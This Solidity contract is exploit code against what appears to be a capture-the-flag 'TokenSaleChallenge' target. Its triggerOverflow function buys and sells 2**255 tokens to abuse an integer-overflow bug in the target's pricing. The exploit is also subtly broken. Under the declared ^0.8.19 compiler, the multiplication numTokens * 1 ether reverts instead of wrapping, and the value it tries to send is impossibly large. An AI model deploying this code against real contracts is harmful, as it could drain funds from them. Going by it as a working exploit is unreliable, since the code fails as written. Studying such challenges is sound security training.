pragma solidity ^0.8.19;

interface ITokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function isComplete() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract Reproduction {
    ITokenSaleChallenge public vulnerableContract;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = ITokenSaleChallenge(_vulnerableContract);
    }
    
    function setup() external payable {
        require(msg.value == 1 ether, "Must send 1 ether");
    }

    function triggerOverflow() external {
        uint256 numTokens = 2**255; 
        vulnerableContract.buy{value: numTokens * 1 ether}(numTokens); 
        vulnerableContract.sell(numTokens);
    }
    
    function verifyExploit() external view returns (bool) {
        return vulnerableContract.isComplete();
    }
}
